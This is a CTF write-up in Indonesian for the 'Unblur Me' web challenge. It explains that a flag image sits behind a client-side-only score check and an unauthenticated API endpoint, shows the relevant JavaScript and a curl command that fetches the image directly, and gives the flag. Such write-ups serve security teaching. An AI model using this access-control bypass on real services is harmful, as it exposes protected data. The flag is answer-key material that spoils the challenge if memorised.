Unblur Me

Ringkasan

Service meminta user menyelesaikan 500 soal kalkulus untuk menghilangkan efek CSS blur pada gambar rahasia image_f84dc2.png.

Masalah utamanya adalah gambar rahasia tersebut langsung diambil dari API saat halaman pertama kali dimuat, tanpa ada verifikasi skor atau sesi di sisi server. Validasi skor 500 hanya diterapkan di sisi browser (client-side) untuk mengubah properti CSS filter: blur(20px) menjadi none.

Source yang relevan

Fungsi pengambilan aset gambar langsung saat inisialisasi halaman:

function loadSecretImage() {
  fetch('/api/v1/internal/fetch-config-blob')
    .then(response => {
      if (!response.ok) throw new Error("Failed to load");
      return response.blob();
    })
    .then(blob => {
      const blobUrl = URL.createObjectURL(blob);
      const img = document.getElementById('flag-image');
      img.src = blobUrl;
    })
}


Logika bypass filter CSS yang hanya berjalan di sisi klien:

if (correctCount >= 500) {
  document.getElementById('quiz-area').innerHTML = "<h2>ACCESS GRANTED</h2>";
  const flag = document.getElementById('flag-image');
  flag.style.filter = "none";
  flag.style.pointerEvents = "auto";
}


Langkah Eksploitasi

Karena endpoint /api/v1/internal/fetch-config-blob terbuka secara publik dan langsung mengembalikan file gambar asli, kita dapat mengunduhnya secara langsung tanpa harus berinteraksi dengan kuis matematika:

curl -s https://broncoctf-unblur-me.chals.io/api/v1/internal/fetch-config-blob --output flag.png


Setelah flag.png (yang mereferensikan file image_f84dc2.png) terunduh, kita dapat membukanya untuk melihat teks flag secara utuh tanpa sensor blur CSS.

Flag

BRONCO{1_WOULDNT_M@K3_YOU_DO_C@LCULUS}
